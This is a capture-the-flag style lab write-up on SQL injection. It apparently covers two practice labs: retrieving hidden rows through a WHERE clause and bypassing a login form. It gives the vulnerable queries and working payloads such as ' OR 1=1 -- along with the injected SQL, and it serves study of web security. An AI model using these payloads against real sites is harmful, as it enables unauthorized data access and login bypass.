# SQL Injection
## SQL injection vulnerability in `WHERE` clause allowing retrieval of hidden data
### Enumeration
- We are given the following webpage 
![[Pasted image 20220624105144.png]]

### Vulnerability Assessment
#### SQL Query
- It is given that the vulnerable SQL query is as below :
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
- Playing around with the category toggle buttons
 ![[Pasted image 20220624110013.png]]
- leads us to the following `GET` request.
![[Pasted image 20220624105945.png]]
- Confirming vulnerability by adding a `'` or in web encoding `%27`
![[Pasted image 20220624110328.png]]
![[Pasted image 20220624110431.png]]
- The resulting `Internal Server Error` tells us that there is an error in the SQL statement which is expected as with the addition of `&27` SQL statement becomes : 
```sql
SELECT * FROM products WHERE category = '' Gifts' AND released = 1
```
### Exploitation
- Thus with knowledge of the query as well as the type of request to use, we can inject `'1 OR 1=1 --` and the SQL query will look like below.
```sql
SELECT * FROM products WHERE category = '' OR 1=1 -- Gifts' AND released = 1
```
- We force a true statement and commented out what is after the true statement to leak out the entire database.
![[Pasted image 20220624111641.png]]
![[Pasted image 20220624111726.png]]

## SQL injection vulnerability allowing login bypass
### Enumeration
- We are given the website and based on the title of the Lab we will simply hop to `My Account`
![[Pasted image 20220624112022.png]]
- Which gives us a Login page
![[Pasted image 20220624112158.png]] 
### Vulnerability Assessment
#### Testing for Request Type
- First we will test the parameters to know if it is `GET` or `POST` based.
![[Pasted image 20220624112252.png]]
![[Pasted image 20220624112303.png]]
- With this ,we now know that a `POST` request is needed.
#### Testing for Vulnerable Parameters
- We will input ` OR 1=1` the Login and Password field individually
![[Pasted image 20220624112523.png]]
![[Pasted image 20220624112810.png]]
- The below error is met for both fields hence both fields are likely vulnerable.
![[Pasted image 20220624112430.png]]
We can postulate that the SQL statement is as such
```sql
SELECT username,password FROM login WHERE username='$input_username' AND password='$input_password'
```
### Exploitation
- Therefore by inputting `'OR 1=1 --` we will give a true statement and bypass the login. The resulting statement will be as follows : 
```sql
SELECT username,password FROM login WHERE username=''OR 1=1 -- AND password='$input_password'

SELECT username,password FROM login WHERE username='aa' AND password='' OR 1=1 -- '
```

![[Pasted image 20220624113426.png]]
![[Pasted image 20220624113315.png]]
- And we managed to bypass the login.
![[Pasted image 20220624113251.png]]